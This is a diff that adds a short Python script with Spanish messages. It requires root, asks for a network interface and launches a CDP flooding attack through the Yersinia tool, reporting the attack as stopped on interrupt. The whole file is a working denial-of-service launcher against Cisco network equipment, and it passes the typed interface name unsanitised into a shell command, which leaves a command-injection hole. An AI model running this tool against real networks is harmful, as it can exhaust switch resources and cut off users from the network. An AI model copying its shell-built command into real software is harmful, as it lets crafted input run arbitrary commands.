@@ -1,0 +1,16 @@
+#!/usr/bin/env python3
+import os
+import sys
+import subprocess
+
+if os.geteuid() != 0:
+    print("Ejecuta con sudo")
+    sys.exit(1)
+
+interface = input("Ingrese la interfaz: ").strip() or "eth0"
+
+print("Iniciando CDP Flooding...")
+try:
+    subprocess.run(f"yersinia cdp -attack 1 -interface {interface}", shell=True)
+except KeyboardInterrupt:
+    print("Ataque detenido.")
